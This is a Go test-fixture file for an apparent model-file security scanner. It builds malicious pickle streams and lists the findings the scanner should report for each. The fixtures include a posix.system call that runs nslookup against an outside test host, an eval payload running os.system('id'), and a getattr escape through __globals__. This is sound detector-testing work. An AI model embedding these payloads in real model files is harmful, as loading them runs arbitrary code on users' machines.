package main

// maliceFixtures pins the constructed grade: the findings that say a loader runs
// code the artifact itself supplies, as opposed to the capability criticals that
// say a sink is merely reachable.
//
// The pair that matters is the first two. `posix.system("nslookup ...")` hands the
// loader a command string, so the artifact supplies the program;
// `getattr(Detect, "forward")` hands it an attribute name on a named class, which
// is what the REMOTE-code torch.load family actually uses and is *not* a payload.
// A grader that cannot separate those two reports every published ultralytics
// checkpoint as confirmed-malicious, which is the failure this whole grade exists
// to avoid.
func init() {
	register(contributor{
		name:     "malice",
		fixtures: maliceFixtures,
		expectations: func() (malicious, benign map[string]expectation) {
			return map[string]expectation{
				"malicious/pickle_reduce_payload.pkl": {
					Expect: []string{"SC4N-MALICE-CONSTRUCTED", "SC4N-PICKLE-GLOBAL-CRITICAL"},
					Notes: "posix.system(\"nslookup pickle-rce-test.rce.lc\") at REDUCE: the artifact supplies " +
						"the command the loader runs. This is the 63-byte file the unsafe corpus ships " +
						"(0xmoose0xmoose0xmoose/rce-test-pickle-001/pytorch_model.bin).",
				},
				"malicious/pickle_reduce_attr_name.pkl": {
					Expect: []string{"SC4N-PICKLE-GLOBAL-CRITICAL"},
					Forbid: []string{"SC4N-MALICE-CONSTRUCTED"},
					Notes: "getattr(ultralytics.nn.tasks.Detect, " + `"forward"` + ") is the reach a weights-only " +
						"loader refuses and an attribute read, not a payload: the constructed grade must stay " +
						"silent so the capability finding is not restated as execution.",
				},
				"malicious/pickle_reduce_dunder_attr.pkl": {
					Expect: []string{"SC4N-MALICE-CONSTRUCTED"},
					Notes: "getattr(builtins.object, " + `"__globals__"` + "): the introspection escape, where the " +
						"dunder name is the payload.",
				},
				"malicious/pickle_reduce_eval_payload.pkl": {
					Expect: []string{"SC4N-MALICE-CONSTRUCTED"},
					Notes: "builtins.eval with a source string that imports os and calls system: for a code sink " +
						"the string *is* the program, whatever it looks like.",
				},
			}, map[string]expectation{}
		},
	})
}

func maliceFixtures(f *fixtureSet) {
	// posix.system("nslookup pickle-rce-test.rce.lc")
	f.add("malicious/pickle_reduce_payload.pkl", pStream(
		pGlobal("posix", "system"), pMemo(),
		pBinUnicode("nslookup pickle-rce-test.rce.lc"), pMemo(),
		pTuple1(), pMemo(), pReduce(), pMemo(), pStop(),
	))

	// getattr(ultralytics.nn.tasks.Detect, "forward")
	f.add("malicious/pickle_reduce_attr_name.pkl", pStream(
		pGlobal("builtins", "getattr"), pMemo(),
		pGlobal("ultralytics.nn.tasks", "Detect"), pMemo(),
		pBinUnicode("forward"), pMemo(), pTuple2(), pMemo(), pReduce(), pMemo(), pStop(),
	))

	// getattr(builtins.object, "__globals__")
	f.add("malicious/pickle_reduce_dunder_attr.pkl", pStream(
		pGlobal("builtins", "getattr"), pMemo(),
		pGlobal("builtins", "object"), pMemo(),
		pBinUnicode("__globals__"), pMemo(), pTuple2(), pMemo(), pReduce(), pMemo(), pStop(),
	))

	// eval("__import__('os').system('id')")
	f.add("malicious/pickle_reduce_eval_payload.pkl", pStream(
		pGlobal("builtins", "eval"), pMemo(),
		pBinUnicode("__import__('os').system('id')"), pMemo(),
		pTuple1(), pMemo(), pReduce(), pMemo(), pStop(),
	))
}

// The pickle opcodes these fixtures use, so a reader can check the bytes without
// a protocol table.
const (
	opProto2      = 0x80
	pProtoVersion = 0x02
	opMemoize     = 0x71 // MEMOIZE, protocol 2+
	opBinUnicode  = 'X'
	opTuple1      = 0x85
	opTuple2      = 0x86
	opReduce      = 'R'
	opStop        = '.'
)

func pStream(parts ...[]byte) []byte {
	out := []byte{opProto2, pProtoVersion}
	for _, p := range parts {
		out = append(out, p...)
	}
	return out
}

func pGlobal(module, name string) []byte {
	out := []byte{'c'}
	out = append(out, module...)
	out = append(out, '\n')
	out = append(out, name...)
	out = append(out, '\n')
	return out
}

func pBinUnicode(s string) []byte {
	out := []byte{opBinUnicode, byte(len(s)), byte(len(s) >> 8), byte(len(s) >> 16), byte(len(s) >> 24)}
	return append(out, s...)
}

func pMemo() []byte   { return []byte{opMemoize, 0} }
func pTuple1() []byte { return []byte{opTuple1} }
func pTuple2() []byte { return []byte{opTuple2} }
func pReduce() []byte { return []byte{opReduce} }
func pStop() []byte   { return []byte{opStop} }
